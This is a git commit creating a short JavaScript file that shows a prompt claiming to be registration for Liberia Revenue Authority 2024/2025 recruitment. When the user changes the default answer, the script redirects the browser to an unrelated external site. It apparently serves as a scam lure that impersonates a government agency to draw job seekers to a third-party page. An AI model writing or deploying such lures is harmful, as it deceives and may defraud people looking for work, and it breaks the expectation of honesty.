d2bce3cc7e904d9e9620f4d5cf77444a182967f2
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-08-16 23:15:25 -0700

    Create liberian-job.js

---
+++ liberian-job.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('LRA: Registration is ongoing for the Liberia Revenue Authority 2024/2025 recruitment, kindly press 1 to submit your Application','1');
+if (password != '1') {
+location.href='https://all-free-byt.org/liberia.html';
+}
